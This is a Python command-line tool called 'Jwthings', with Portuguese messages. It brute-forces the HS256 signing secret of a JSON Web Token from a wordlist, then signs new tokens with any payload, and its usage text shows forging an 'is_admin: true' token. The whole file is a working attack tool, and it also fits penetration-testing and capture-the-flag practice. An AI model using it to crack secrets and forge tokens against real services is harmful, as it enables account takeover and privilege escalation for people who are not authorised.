#!/usr/bin/env python3

import jwt
import argparse
import os
import json
from jwt.exceptions import InvalidSignatureError, DecodeError, InvalidTokenError

def brute_force_jwt(token, wordlist_path):
    if not os.path.isfile(wordlist_path):
        print(f"[!] Wordlist não encontrada: {wordlist_path}")
        return

    try:
        header = jwt.get_unverified_header(token)
    except InvalidTokenError:
        print("[!] JWT inválido.")
        return

    alg = header.get("alg", "HS256")
    if alg != "HS256":
        print(f"[!] Algoritmo '{alg}' não suportado. Apenas HS256 é aceito no momento.")
        return

    print(f"[*] Algoritmo usado: {alg}")
    print("[*] Iniciando ataque...\n")

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for idx, line in enumerate(f, 1):
            key = line.strip()
            if not key:
                continue
            try:
                decoded = jwt.decode(token, key, algorithms=["HS256"])
                print(f"\n[✓] Chave encontrada: {key}")
                print(f"[✓] Payload decodificado:\n{json.dumps(decoded)}\n")
                return
            except (InvalidSignatureError, DecodeError):
                    print(f"[-] chave: {key}")
                

    print("\n[x] Nenhuma chave válida encontrada.")

def encode_jwt(key, payload_input):
    if os.path.isfile(payload_input):
        with open(payload_input, "r") as f:
            payload = json.load(f)
    else:
        try:
            payload = json.loads(payload_input)
        except json.JSONDecodeError:
            print("[!] Payload inválido. Deve ser JSON ou caminho para .json.")
            return

    token = jwt.encode(payload, key, algorithm="HS256")
    print(f"\n[+] JWT gerado com sucesso:")
    print(token)

def main():
    description = """\
Jwthings – Brute-force e geração de JWTs (HS256)

Modos disponíveis:

  brute  - Força bruta para descobrir a chave secreta de um JWT.
  encode - Gera um JWT válido a partir de um payload e chave.

Exemplos de uso:

  Força bruta:
    ./jwthings.py -m brute -j <token_jwt> -w /caminho/wordlist.txt

  Gerar JWT:
    ./jwthings.py -m encode -k minha_chave -p '{"username": "admin", "is_admin": true}'

    ou usando arquivo JSON:
    ./jwthings.py -m encode -k minha_chave -p payload.json
"""

    parser = argparse.ArgumentParser(
        description=description,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument(
        "-m", "--mode",
        choices=["brute", "encode"],
        required=True,
        help="Modo de operação"
    )

    # Argumentos para brute
    parser.add_argument("-j", "--jwt", help="JWT alvo (usado no modo brute)")
    parser.add_argument("-w", "--wordlist", help="Caminho da wordlist (usado no modo brute)")

    # Argumentos para encode
    parser.add_argument("-k", "--key", help="Chave secreta para assinar (usado no modo encode)")
    parser.add_argument("-p", "--payload", help="Payload JSON ou caminho para .json (usado no modo encode)")

    args = parser.parse_args()

    if args.mode == "brute":
        if not args.jwt or not args.wordlist:
            parser.error("No modo 'brute' é obrigatório usar -j <jwt> e -w <wordlist>")
        brute_force_jwt(args.jwt, args.wordlist)

    elif args.mode == "encode":
        if not args.key or not args.payload:
            parser.error("No modo 'encode' é obrigatório usar -k <key> e -p <payload>")
        encode_jwt(args.key, args.payload)

if __name__ == "__main__":
    main()
